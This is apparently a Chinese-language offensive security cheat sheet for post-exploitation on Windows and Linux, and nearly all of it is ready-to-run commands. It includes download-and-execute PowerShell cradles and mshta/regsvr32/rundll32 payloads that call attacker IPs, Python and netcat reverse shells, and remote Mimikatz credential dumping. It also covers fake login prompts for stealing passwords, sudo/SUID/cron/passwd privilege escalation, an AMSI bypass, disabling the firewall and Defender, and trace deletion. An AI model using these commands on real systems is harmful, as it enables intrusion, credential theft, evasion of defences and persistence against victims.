<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span></span><br><span class="line">&lt;stylesheet</span><br><span class="line">xmlns=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:ms=&quot;urn:schemas-microsoft-com:xslt&quot;</span><br><span class="line">xmlns:user=&quot;placeholder&quot;</span><br><span class="line">version=&quot;1.0&quot;&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">output</span> <span class="attr">method</span>=<span class="string">&quot;text&quot;</span>/&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">ms:script</span> <span class="attr">implements-prefix</span>=<span class="string">&quot;user&quot;</span> <span class="attr">language</span>=<span class="string">&quot;JScript&quot;</span>&gt;</span></span><br><span class="line"> &lt;![CDATA[</span><br><span class="line"> var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd&quot;);</span><br><span class="line"> ]]&gt; <span class="tag">&lt;/<span class="name">ms:script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">stylesheet</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="132.png" alt="image"></p>
<pre><code>执行
&gt;cscript.exe //nologo C:\Windows\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty
</code></pre>
<p><img src="133.png" alt="image"></p>
<h4 id="Mshta-1"><a href="#Mshta-1" class="headerlink" title="Mshta"></a>Mshta</h4><pre><code>&gt;use exploit/windows/misc/hta_server
&gt;set srvhost 192.168.0.107
&gt;mshta http://192.168.0.107:8080/RgNeCv.hta
</code></pre>
<p><img src="134.png" alt="image"></p>
<pre><code>执行vb
    &gt;mshta vbscript:CreateObject(&quot;Wscript.Shell&quot;).Run(&quot;calc.exe&quot;,0,true)(window.close)
Js
    &gt;mshta javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;calc.exe&quot;,0,true);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im mshta.exe&quot;,0,true);&#125;
Jsrat
    &gt;mshta javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://192.168.2.101:9998/connect&quot;,false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im mshta.exe&quot;,0,true);&#125;
</code></pre>
<h4 id="Regsvr32"><a href="#Regsvr32" class="headerlink" title="Regsvr32"></a>Regsvr32</h4><pre><code>上线Empire
&gt;usestager windows/launcher_sct
生成sct文件放入web目录
&gt;regsvr32 /s /n /u /i:http://192.168.0.107:8080/launcher.sct scrobj.dll
&gt;cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:http://192.168.0.107/test.sct
</code></pre>
<h4 id="Rundll32"><a href="#Rundll32" class="headerlink" title="Rundll32"></a>Rundll32</h4><h5 id="执行文件"><a href="#执行文件" class="headerlink" title="执行文件"></a>执行文件</h5><pre><code>&gt;rundll32 url.dll, OpenURL file://c:\windows\system32\calc.exe
&gt;rundll32 url.dll, OpenURLA file://c:\windows\system32\calc.exe
&gt;rundll32 url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e
&gt;rundll32 url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e
&gt;rundll32 url.dll, FileProtocolHandler calc.exe
</code></pre>
<h5 id="无弹窗执行"><a href="#无弹窗执行" class="headerlink" title="无弹窗执行"></a>无弹窗执行</h5><pre><code>&gt;rundll32 javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;C:/Windows/System32/mshta.exe http://192.168.0.107:8080/SU8Fd6kNRz0.hta&quot;,0,true);self.close();
</code></pre>
<h5 id="增删注册表"><a href="#增删注册表" class="headerlink" title="增删注册表"></a>增删注册表</h5><pre><code>保存为.inf文件
&gt;rundll32.exe setupapi,InstallHinfSection DefaultInstall 128 c:/reg.inf
[Version]
Signature=&quot;$WINDOWS NT$&quot;
[DefaultInstall]
AddReg=AddReg
DelReg=DelReg
[AddReg] #删除DelReg删掉红色部分执行
HKLM,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,SYSTEM,0x00000000,c:/windows/temp/sv.exe
0x00010001表示REG_DWORD数据类型，0x00000000或省略该项(保留逗号)表示REG_SZ(字符串)
</code></pre>
<h5 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h5><pre><code>&gt;rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;fso=new%20ActiveXObject(&quot;Scripting.FileSystemObject&quot;);a=fso.CreateTextFile(&quot;c:\\Temp\\testfile.txt&quot;,true);a.WriteLine(&quot;Test&quot;);a.Close();self.close();
</code></pre>
<h5 id="Out-RundllCommand"><a href="#Out-RundllCommand" class="headerlink" title="Out-RundllCommand"></a>Out-RundllCommand</h5><pre><code>使用nishang脚本Out-RundllCommand生成rundll代码
&gt;powershell -nop -w h -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/nishang/Execution/Out-RundllCommand.ps1&#39;); Out-RundllCommand -Reverse -IPAddress 192.168.0.107 -Port 12345&quot;
</code></pre>
<p><img src="135.png" alt="image"><br><img src="136.png" alt="image"></p>
<pre><code>注：低版本powershell，隐藏窗口只识别-w hidden，高版本可以-w h
执行远程PS脚本
&gt;Out-RundllCommand -PayloadURL http://192.168.0.107/Invoke-PowerShellUdp.ps1 -Arguments &quot;Invoke-PowerShellUdp -Reverse -IPAddress 192.168.0.107 -Port 12138&quot;
上线MSF
生成psh-reflection格式脚本
&gt;rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();r=new%20ActiveXObject(&quot;WScript.Shell&quot;).run(&quot;powershell -w hidden -nologo -noprofile -ep bypass IEX ((New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/xx.ps1&#39;));&quot;,0,true);
</code></pre>
<h4 id="DotNetToJScript"><a href="#DotNetToJScript" class="headerlink" title="DotNetToJScript"></a>DotNetToJScript</h4><pre><code>通过js/vbs执行.net程序
https://github.com/tyranid/DotNetToJScript/releases
&gt;DotNetToJScript.exe -o 1.js ExampleAssembly.dll 生成js
&gt;DotNetToJScript.exe -l vbscript -o 2.vbs ExampleAssembly.dll生成vbs
&gt;DotNetToJScript.exe -l vba -o 2.txt ExampleAssembly.dll 生成vba
&gt;DotNetToJScript.exe -u -o 3.sct ExampleAssembly.dll生成sct
</code></pre>
<h5 id="StarFighters"><a href="#StarFighters" class="headerlink" title="StarFighters"></a>StarFighters</h5><pre><code>https://github.com/Cn33liz/StarFighters 可以执行powershell代码，详见
执行单条命令
$code = &#39;start calc.exe&#39;
$bytes  = [System.Text.Encoding]::UNICODE.GetBytes($code);
$encoded = [System.Convert]::ToBase64String($bytes)
$encoded
复制为var EncodedPayload的值
远程执行mimikatz
powershell IEX &quot;(New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/powersploit/Exfiltration/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz -Command &#39;log privilege::debug sekurlsa::logonpasswords&#39;&quot;
以上保存在code.txt
$code = Get-Content -Path code.txt
$bytes  = [System.Text.Encoding]::UNICODE.GetBytes($code);
$encoded = [System.Convert]::ToBase64String($bytes)
$encoded | Out-File 2.txt
</code></pre>
<p><img src="137.png" alt="image"></p>
<pre><code>生成的2.txt文件内容替换为var EncodedPayload的值再执行
</code></pre>
<p><img src="138.png" alt="image"><br><img src="139.png" alt="image"></p>
<h5 id="绕过AMSI执行"><a href="#绕过AMSI执行" class="headerlink" title="绕过AMSI执行"></a>绕过AMSI执行</h5><pre><code>&gt;copy c:\windows\system32\cscript.exe amsi.dll
&gt;amsi.dll evil.js
</code></pre>
<h4 id="WMIC"><a href="#WMIC" class="headerlink" title="WMIC"></a>WMIC</h4><pre><code>Empire建立监听，生成windows/launcher_xsl模块的xsl文件保存在web目录
&gt;wmic process get brief /format:http://192.168.0.107:8080/launcher.xsl
也可结合mshta使用
</code></pre>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span></span><br><span class="line">&lt;stylesheet</span><br><span class="line">xmlns=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:ms=&quot;urn:schemas-microsoft-com:xslt&quot;</span><br><span class="line">xmlns:user=&quot;placeholder&quot;</span><br><span class="line">version=&quot;1.0&quot;&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">output</span> <span class="attr">method</span>=<span class="string">&quot;text&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">ms:script</span> <span class="attr">implements-prefix</span>=<span class="string">&quot;user&quot;</span> <span class="attr">language</span>=<span class="string">&quot;JScript&quot;</span>&gt;</span></span><br><span class="line">	&lt;![CDATA[</span><br><span class="line">	var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;mshta http://192.168.0.107:8080/RgNeCv.hta&quot;);</span><br><span class="line">	]]&gt; <span class="tag">&lt;/<span class="name">ms:script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">stylesheet</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="Msxsl"><a href="#Msxsl" class="headerlink" title="Msxsl"></a>Msxsl</h4><pre><code>下载
https://www.microsoft.com/en-us/download/details.aspx?id=21714
远程执行shellcode
https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker/blob/master/shellcode.xml
&gt;msxls.exe http://192.168.0.107/shellcode.xml http://192.168.0.107/shellcode.xml
Empire生成shellcode贴到脚本中EncodedPayload位置
</code></pre>
<p><img src="140.png" alt="image"></p>
<h4 id="CPL"><a href="#CPL" class="headerlink" title="CPL"></a>CPL</h4><pre><code>Kali监听
</code></pre>
<p><img src="141.png" alt="image"></p>
<pre><code>编译成DLL
</code></pre>
<p><img src="142.png" alt="image"></p>
<pre><code>Control执行
&gt;control C:\Users\Administrator.DC\Desktop\VC6.0green\MyProjects\dll\Debug\dll.dll
</code></pre>
<p><img src="143.png" alt="image"></p>
<pre><code>或将DLL后缀改为cpl，双击执行，或rundll32执行
&gt;rundll32.exe shell32.dll,Control_RunDLL C:\Users\Administrator.DC\Desktop\VC6.0green\MyProjects\dll\Debug\dll.dll
</code></pre>
<h3 id="Runas"><a href="#Runas" class="headerlink" title="Runas"></a>Runas</h3><pre><code>#use exploit/windows/local/ask
</code></pre>
<h3 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h3><h4 id="MSF-2"><a href="#MSF-2" class="headerlink" title="MSF"></a>MSF</h4><pre><code>Meterpreter&gt;use incognito
Meterpreter&gt;list_tokens -u
Meterpreter&gt;impersonate_token name\\administrator
&amp;
Meterpreter&gt;ps
Meterpreter&gt;steal_token pid
</code></pre>
<h4 id="Cobalt-strike"><a href="#Cobalt-strike" class="headerlink" title="Cobalt strike"></a>Cobalt strike</h4><pre><code>beacon&gt; steal_token 1234 窃取令牌
beacon&gt; rev2self 恢复令牌
Windows
https://gitee.com/RichChigga/incognito2
</code></pre>
<h3 id="密码窃取"><a href="#密码窃取" class="headerlink" title="密码窃取"></a>密码窃取</h3><h4 id="伪造锁屏"><a href="#伪造锁屏" class="headerlink" title="伪造锁屏"></a>伪造锁屏</h4><pre><code>https://github.com/Pickfordmatt/SharpLocker/releases
</code></pre>
<p><img src="144.png" alt="image"></p>
<pre><code>https://github.com/bitsadmin/fakelogonscreen/releases
</code></pre>
<p><img src="145.png" alt="image"></p>
<pre><code>记录的密码保存在
%LOCALAPPDATA%\Microsoft\user.db
</code></pre>
<p><img src="146.png" alt="image"></p>
<h4 id="伪造认证框"><a href="#伪造认证框" class="headerlink" title="伪造认证框"></a>伪造认证框</h4><h5 id="CredsLeaker"><a href="#CredsLeaker" class="headerlink" title="CredsLeaker"></a>CredsLeaker</h5><pre><code>https://github.com/Dviros/CredsLeaker
将cl_reader.php，config.php，config.cl上传到web服务器
修改CredsLeaker.ps1、run.bat中URL参数
</code></pre>
<p><img src="147.png" alt="image"></p>
<pre><code>输入正确密码后会自动结束，否则除非结束powershell进程才可结束
获取到正确密码后会在目录下生成creds.txt保存密码信息
</code></pre>
<p><img src="148.png" alt="image"></p>
<h5 id="LoginPrompt"><a href="#LoginPrompt" class="headerlink" title="LoginPrompt"></a>LoginPrompt</h5><pre><code>&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString(&#39;http://192.168.0.107/ps/Invoke-LoginPrompt.ps1&#39;);invoke-LoginPrompt&quot;
</code></pre>
<p><img src="149.png" alt="image"></p>
<pre><code>除非结束进程，否则只能输对密码才能关闭对话框。
收到正确密码会返回结果
</code></pre>
<p><img src="150.png" alt="image"></p>
<h5 id="Nishang-Invoke-CredentialsPhish"><a href="#Nishang-Invoke-CredentialsPhish" class="headerlink" title="Nishang-Invoke-CredentialsPhish"></a>Nishang-Invoke-CredentialsPhish</h5><pre><code>&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString(&#39;http://192.168.0.108/ps/nishang/Gather/Invoke-CredentialsPhish.ps1&#39;); Invoke-CredentialsPhish&quot;
</code></pre>
<p><img src="151.png" alt="image"><br><img src="152.png" alt="image"></p>
<h3 id="RottenPotato"><a href="#RottenPotato" class="headerlink" title="RottenPotato"></a>RottenPotato</h3><pre><code>https://github.com/foxglovesec/RottenPotato Meterpreter&gt;use incognito
Meterpreter&gt;list_tokens -u
Meterpreter&gt;upload /root/Desktop/rottenpotato.exe
Meterpreter&gt;execute -HC -f rottenpotato.exe
Meterpreter&gt;impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;
</code></pre>
<h3 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h3><pre><code>检测有漏洞的服务
&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString(&#39;http://192.168.0.107/ps/powertools/PowerUp/PowerUp.ps1&#39;);Invoke-AllChecks&quot;
</code></pre>
<p><img src="153.png" alt="image"></p>
<pre><code>&gt;icacls C:\Windows\system32\\wlbsctrl.dll 查看文件权限，F为完全控制，M修改
</code></pre>
<p><img src="154.png" alt="image"></p>
<pre><code>在AbuseFunction中会显示利用语句。
&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString(&#39;http://192.168.0.107/ps/powertools/PowerUp/PowerUp.ps1&#39;); Write-HijackDll -OutputFile &#39;C:\Windows\system32\\wlbsctrl.dll&#39; -Command &#39;net user admin pass@Qwe1 /add&amp;net localgroup administrators admin /add&#39;&quot;
</code></pre>
<p><img src="155.png" alt="image"></p>
<pre><code>重启电脑后会新增用户admin
</code></pre>
<p><img src="156.png" alt="image"></p>
<pre><code>查找可能劫持的进程
&gt;Find-ProcessDLLHijack
查找环境变量中当前用户可修改的目录
&gt;Find-PathDLLHijack
查找存在注册表中自动登录用户的平局
&gt;Get-RegistryAutoLogon
查询trusted_service_path
&gt;Get-ServiceUnquoted
查询当前用户可修改的注册表开机启动项
&gt;Get-ModifiableRegistryAutoRun
查询当前用户可修改的计划任务项
&gt;Get-ModifiableScheduledTaskFile
查询系统中所有web.config文件中的明文密码
&gt;Get-WebConfig
</code></pre>
<h3 id="Powerup-AlwaysInstallElevated"><a href="#Powerup-AlwaysInstallElevated" class="headerlink" title="Powerup-AlwaysInstallElevated"></a>Powerup-AlwaysInstallElevated</h3><pre><code>&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString(&#39;http://192.168.0.107/ps/powertools/PowerUp/PowerUp.ps1&#39;);Get-RegAlwaysInstallElevated&quot;
</code></pre>
<p><img src="157.png" alt="image"></p>
<pre><code>&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString(&#39;http://192.168.0.107/ps/powertools/PowerUp/PowerUp.ps1&#39;); Write-UserAddMSI&quot;
普通用户执行安装
</code></pre>
<p><img src="158.png" alt="image"><br><img src="159.png" alt="image"></p>
<h3 id="AlwaysInstallElevated提权"><a href="#AlwaysInstallElevated提权" class="headerlink" title="AlwaysInstallElevated提权"></a>AlwaysInstallElevated提权</h3><pre><code>&gt;reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
&gt;reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
为1 检测是否永远以高权限启动安装
#HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
新建DWORD32 DisableMSI=0
#msfvenom -p windows/adduser USER=msi PASS=pass@123 -f msi -o /root/add.msi
#upload /root/add.msi c:\\1.msi
&gt;msiexec /quiet /qn /i c:\1.msi
MSF
#use exploit/windows/local/always_install_elevated
#set session 1
</code></pre>
<h3 id="Trusted-Service-Paths"><a href="#Trusted-Service-Paths" class="headerlink" title="Trusted Service Paths"></a>Trusted Service Paths</h3><pre><code>&gt;wmic service get name,displayname,pathname,startmode |findstr /i &quot;auto&quot; |findstr /i /v &quot;c:\windows\\&quot; |findstr /i /v &quot;&quot;&quot; 列出没有用引    号包含的服务
#use exploit/windows/local/trusted_service_path
#set session 1
</code></pre>
<h3 id="Vulnerable-Services"><a href="#Vulnerable-Services" class="headerlink" title="Vulnerable Services"></a>Vulnerable Services</h3><pre><code>#use exploit/windows/local/service_permissions
#set session 1
</code></pre>
<h3 id="Sudo提权"><a href="#Sudo提权" class="headerlink" title="Sudo提权"></a>Sudo提权</h3><pre><code>/home/user/.sudo_as_admin_successful
&gt;sudo zip /tmp/test.zip /tmp/test -T --unzip-command=&quot;sh -c /bin/bash&quot;
&gt;sudo tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash
&gt;sudo strace –o /dev/null /bin/bash
&gt;sudo nmap –interactive nmap&gt;!sh
&gt;echo &quot;os.execute(&#39;/bin.sh&#39;)&quot;&gt;/tmp/1.nse
&gt;sudo nmap –script=/tmp/shell.nse 
&gt;sudo more/less/man /etc/rsyslog.conf
&gt;sudo git help status 
&gt;!/bin/bash
&gt;sudo ftp
&gt;!/bin/bash
&gt;sudo vim -c &#39;!sh&#39;
&gt;sudo find /bin/ -name ls -exec /bin/bash ;
&gt;sudo awk &#39;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#39;
</code></pre>
<h3 id="Linux计划任务"><a href="#Linux计划任务" class="headerlink" title="Linux计划任务"></a>Linux计划任务</h3><pre><code>&gt;for user in $(getent passwd|cut -f1 -d:); do echo &quot;### Crontabs for $user ####&quot;; crontab -u $user -l; done 列举所有用户的crontab
$cat /etc/crontab
$echo &#39;echo &quot;ignite ALL=(root) NOPASSWD: ALL&quot; &gt; /etc/sudoers&#39; &gt;test.sh
$echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh test.sh&quot;
$echo &quot;&quot; &gt; --checkpoint=1
或编辑可写的计划任务文件
#!/usr/bin/python
import os,subprocess,socket
s=socket.socekt(socket.AF_INET,socket.SOCK_STREAM)
s.connect((&quot;192.168.0.107&quot;,&quot;5555&quot;))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])
</code></pre>
<h3 id="Linux-SUID提权"><a href="#Linux-SUID提权" class="headerlink" title="Linux SUID提权"></a>Linux SUID提权</h3><pre><code>查找有root权限的SUID文件
$find / -perm -u=s -type f 2&gt;/dev/null
$find / -user root -perm -4000 -print 2&gt;/dev/null
$find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;
</code></pre>
<h4 id="Find"><a href="#Find" class="headerlink" title="Find"></a>Find</h4><pre><code>$touch xxx
$/usr/bin/find xxx –exec whoami \;
$/usr/bin/find xxx –exec python -c &#39;import     socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.2&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;  \;
&amp;
&gt;find xxx -exec netcat -lvp 12138 -e /bin/sh \; 然后攻击机主动连接
</code></pre>
<h4 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h4><pre><code># 进入nmap的交互模式
&gt;nmap --interactive 
&gt;!sh
</code></pre>
<h4 id="VIM"><a href="#VIM" class="headerlink" title="VIM"></a>VIM</h4><pre><code>&gt;vim.tiny /etc/shadow
&amp;
&gt;vim.tiny
# 按ESC
:set shell=/bin/sh
:shell
</code></pre>
<h4 id="BASH"><a href="#BASH" class="headerlink" title="BASH"></a>BASH</h4><pre><code>&gt;bash –p
</code></pre>
<p>####More/Less/Man<br>    &gt;less /etc/passwd<br>    !/bin/sh<br>    &gt;more /etc/passwd<br>    !/bin/bash<br>    &gt;man passwd<br>    !/bin/bash</p>
<h4 id="CP-MV"><a href="#CP-MV" class="headerlink" title="CP/MV"></a>CP/MV</h4><pre><code>覆盖shadow文件
</code></pre>
<h3 id="Linux-etc-passwd提权"><a href="#Linux-etc-passwd提权" class="headerlink" title="Linux /etc/passwd提权"></a>Linux /etc/passwd提权</h3><pre><code>$ls –lh /etc/passwd 若是任何用户可读写
$perl -le &#39;print crypt(&quot;password@123&quot;,&quot;addedsalt&quot;)&#39; 生成密码
$echo &quot;test:advwtv/9yU5yQ:0:0:User_like_root:/root:/bin/bash&quot; &gt;&gt;/etc/passwd
一条命令添加root用户
#useradd -p `openssl passwd -1 -salt &#39;user&#39; 123qwe` -u 0 -o -g root  -G root -s /bin/bash -d /home/user venus
用户名venus 密码123qwe
#useradd newuser;echo &quot;newuser:password&quot;|chpasswd
&gt;echo &quot;admin:x:0:0::/:/bin/sh&quot; &gt;&gt; /etc/passwd
&gt;passwd admin修改密码
</code></pre>
<h3 id="Linux脏牛提权"><a href="#Linux脏牛提权" class="headerlink" title="Linux脏牛提权"></a>Linux脏牛提权</h3><pre><code>https://github.com/FireFart/dirtycow
$gcc -pthread dirty.c -o dirty –lcrypt
$./dirty passwd 
生成账户密码
https://github.com/gbonacini/CVE-2016-5195
$make
$./dcow -s
</code></pre>
<h2 id="RDP-amp-Fireawall"><a href="#RDP-amp-Fireawall" class="headerlink" title="RDP&amp;Fireawall"></a>RDP&amp;Fireawall</h2><h3 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h3><pre><code>Hydra爆破RDP
&gt;hydra -l admin -P /root/Desktop/passwords -S 192.168.0.0 rdp
&amp;
Nlbrute
</code></pre>
<p><img src="160.png" alt="image"></p>
<h3 id="注册表开启"><a href="#注册表开启" class="headerlink" title="注册表开启"></a>注册表开启</h3><pre><code>查询系统是否允许3389远程连接：
&gt;REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections
1表示关闭，0表示开启
查看远程连接的端口：
&gt;REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber
本机开启3389远程连接的方法
通过cmd
&gt;REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
&gt;REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x00000d3d /f
通过reg文件
内容如下：
Windows Registry Editor Version 5.00
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]
&quot;fDenyTSConnections&quot;=dword:00000000
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]
&quot;PortNumber&quot;=dword:00000d3d
导入注册表：
regedit /s a.reg
</code></pre>
<h3 id="NETSH启动服务"><a href="#NETSH启动服务" class="headerlink" title="NETSH启动服务"></a>NETSH启动服务</h3><pre><code>&gt;netsh firewall set service remoteadmin enable 
&gt;netsh firewall set service remotedesktop enable
&gt;netsh firewall set opmode disable 关闭防火墙
</code></pre>
<h3 id="注入点开启"><a href="#注入点开启" class="headerlink" title="注入点开启"></a>注入点开启</h3><pre><code>.asp?id=100;exec master.dbo.xp_regwrite &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SYSTEM\CurrentControlSet\Control\Terminal Server&#39;,&#39;fDenyTSConnections&#39;,&#39;REG_DWORD&#39;,0;--
注：
修改连接端口重启后生效
</code></pre>
<h3 id="MSF开启"><a href="#MSF开启" class="headerlink" title="MSF开启"></a>MSF开启</h3><pre><code>#run post/windows/manage/enable_rdp
</code></pre>
<h3 id="Wmic开启"><a href="#Wmic开启" class="headerlink" title="Wmic开启"></a>Wmic开启</h3><pre><code>&gt;wmic /node:192.168.1.2 /USER:administrator PATH win32_terminalservicesetting WHERE (__Class!=&quot;&quot;) CALL SetAllowTSConnections 1
</code></pre>
<h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><pre><code>允许进站
如果系统未配置过远程桌面服务，第一次开启时还需要添加防火墙规则，允许3389端口，命令如下:
&gt;netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow
&gt;netsh firewall set portopening TCP 3389 ENABLE
防火墙关闭
&gt;netsh firewall set opmode mode=disable
&gt;netsh advfirewall show allprofiles查看状态
&gt;netsh advfirewall set allprofiles state off 
&gt;sc stop windefend
&gt;sc delete windefend
PS&gt; Set-MpPreference -DisableRealtimeMonitoring 1
PS&gt; Set-MpPreference -Disablearchivescanning $true
</code></pre>
<h3 id="多用户登录"><a href="#多用户登录" class="headerlink" title="多用户登录"></a>多用户登录</h3><pre><code>Mimikatz设置允许多用户登录
&gt;privilege::debug
&gt;ts::multirdp
rdpwrap
https://github.com/stascorp/rdpwrap
&gt;RDPWInst.exe -i is
</code></pre>
<h3 id="RDP连接记录"><a href="#RDP连接记录" class="headerlink" title="RDP连接记录"></a>RDP连接记录</h3><pre><code>https://github.com/3gstudent/List-RDP-Connections-History
查看本机用户连接RDP的记录
</code></pre>
<p><img src="161.png" alt="image"></p>
<pre><code>&gt;Psloggedon.exe username
</code></pre>
<p><img src="162.png" alt="image"></p>
<h3 id="删除痕迹"><a href="#删除痕迹" class="headerlink" title="删除痕迹"></a>删除痕迹</h3><pre><code>@echo off
@reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; /va /f
@del &quot;%USERPROFILE%\My Documents\Default.rdp&quot; /a
@exit
</code></pre>
<h2 id="端口映射-amp-转发"><a href="#端口映射-amp-转发" class="headerlink" title="端口映射&amp;转发"></a>端口映射&amp;转发</h2><h3 id="MSF-3"><a href="#MSF-3" class="headerlink" title="MSF"></a>MSF</h3><pre><code>使用条件：服务器通外网，拥有自己的公网ip
&gt;portfwd add -l 5555 -p 3389 -r 172.16.86.153
转发目标主机的3389远程桌面服务端口到本地的5555
&gt;portfwd list
</code></pre>
<h3 id="lcx-exe"><a href="#lcx-exe" class="headerlink" title="lcx.exe"></a>lcx.exe</h3><pre><code>使用条件：服务器通外网，拥有自己的公网ip
靶机：lcx.exe -slave 外网IP 9999 127.0.0.1 3389
linux攻击机：./portmap -m 2 -p1 9999 -p2 33889
windows攻击机：lcx -listen 9999 33889 把本机9999监听的信息转到33889
PortTran
https://github.com/k8gege/K8tools/raw/master/PortTran.rar
攻击机执行
&gt;PortTranS20.exe 12345 389
</code></pre>
<p><img src="163.png" alt="image"></p>
<pre><code>靶机执行
&gt;PortTranC20.exe 127.0.0.1 3389 192.168.0.102 12345
建立连接后，攻击机连接本机389端口即可
</code></pre>
<p><img src="164.png" alt="image"></p>
<h3 id="SSH-1"><a href="#SSH-1" class="headerlink" title="SSH"></a>SSH</h3><pre><code>-C 压缩传输，加快传输速度
-f 在后台对用户名密码进行认证
-N 仅仅只用来转发，不用再弹回一个新的shell -n 后台运行
-q 安静模式，不要显示任何debug信息
-l 指定ssh登录名
-g 允许远程主机连接到本地用于转发的端口
-L 进行本地端口转发
-R 进行远程端口转发
-D 动态转发，即socks代理
-T 禁止分配伪终端
-p 指定远程ssh服务端口
</code></pre>
<h4 id="正向转发"><a href="#正向转发" class="headerlink" title="正向转发"></a>正向转发</h4><pre><code>外网靶机110
内网靶机115
本地攻击机编辑后restart ssh服务
#vim /etc/ssh/sshd_conf
AllowTcpForwarding yes 允许TCP转发
GatewayPorts yes   允许远程主机连接本地转发的端口
TCPKeepAlive yes    TCP会话保持存活
PasswordAuthentication yes  密码认证
&gt;ssh -C -f -N -g -L 33890:192.168.0.115:3389 root@192.168.0.110 -p 22
本地攻击机执行，本地33890转发到远程的3389端口
上线MSF
攻击机出网Linux靶机--不出网Linux靶机--不出网win机
&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=不出网Linux机 lport=12138 -f exe -o /var/www/html/1.exe
攻击机监听端口12345
不出网Linux机
